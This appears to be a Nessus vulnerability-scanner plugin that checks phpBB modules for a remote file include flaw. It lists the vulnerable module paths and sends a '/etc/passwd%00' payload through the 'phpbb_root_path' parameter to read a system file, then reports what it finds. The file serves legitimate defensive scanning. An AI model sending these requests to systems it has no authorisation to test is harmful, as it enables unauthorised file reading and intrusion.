#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is prone to
remote file include attacks. 

Description :

The remote host contains a third-party module for phpBB. 

The version of at least one such component or module installed on the
remote host fails to sanitize input to the 'phpbb_root_path' parameter
before using it to include PHP code.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit these flaws to view arbitrary files on the remote
host or to execute arbitrary PHP code, possibly taken from third-party
hosts. 

See also :

http://pridels.blogspot.com/2006/05/phpbb-auction-mod-remote-file.html
http://milw0rm.com/exploits/2483
http://milw0rm.com/exploits/2522
http://milw0rm.com/exploits/2525
http://milw0rm.com/exploits/2533
http://milw0rm.com/exploits/2538
http://archives.neohapsis.com/archives/bugtraq/2006-10/0210.html
http://www.phpbb.com/phpBB/viewtopic.php?p=2504370&highlight=#2504370

Solution :

Disable PHP's 'register_globals' setting or contact the product's
author to see if an upgrade exists. 

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description)
{
  script_id(21323);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2006-2245", "CVE-2006-5301", "CVE-2006-5306", "CVE-2006-5390", "CVE-2006-5418");
  script_bugtraq_id(17822, 20484, 20485, 20493, 20501, 20518, 20525, 20558, 20571);
  script_xref(name:"OSVDB", value:"25263");

  script_name(english:"phpBB Module phpbb_root_path Parameter Remote File Include Vulnerability");
  script_summary(english:"Tries to read a local file using phpBB modules");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("phpbb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Vulnerable scripts.
# - modules
nmods = 0;
mod = make_array();
# -   ACP User Registration
mod[nmods++] = "/includes/functions_mod_user.php";
# -   Admin User Viewed Posts Tracker
mod[nmods++] = "/includes/functions_user_viewed_posts.php";
# -   AI chat (included in PlusXL)
mod[nmods++] = "/mods/iai/includes/constants.php";
# -   Import Tools - Members
mod[nmods++] = "/includes/functions_mod_user.php";
# -   Insert User
mod[nmods++] = "/includes/functions_mod_user.php";
# - Journals System
mod[nmods++] = "/includes/journals_delete.php";
mod[nmods++] = "/includes/journals_edit.php";
mod[nmods++] = "/includes/journals_post.php";
# -   phpBB auction
mod[nmods++] = "/auction/auction_common.php";
# -   phpBB Search Engine Indexer
mod[nmods++] = "/includes/archive/archive_topic.php";
# -   phpBB Security
mod[nmods++] = "/includes/phpbb_security.php";
# -   SpamBlockerMod
mod[nmods++] = "/includes/antispam.php";


info = "";
contents = "";


# Test an install.
install = get_kb_item(string("www/", port, "/phpBB"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  for (i=0; i<nmods; i++)
  {
    req = http_get(
      item:string(
        dir, mod[i], "?",
        "phpbb_root_path=", file
      ), 
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream".
      egrep(pattern:"main\(/etc/passwd\\0.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
    {
      info = info +
             "  " + dir + mod[i] + '\n';

      if (!contents && egrep(string:res, pattern:"root:.*:0:[01]:"))
        contents = res - strstr(res, "<br");

      if (!thorough_tests) break;
    }
  }
  if (info && !thorough_tests) break;
}

if (info)
{
  if (contents)
    info = string(
      info,
      "\n",
      "And here are the contents of the file '/etc/passwd' that Nessus\n",
      "was able to read from the remote host :\n",
      "\n",
      contents
    );

  report = string(
    desc,
    "\n\n",
    "Plugin output :\n",
    "\n",
    "The following scripts(s) are vulnerable :\n",
    "\n",
    info
  );

  security_warning(port:port, data:report);
}
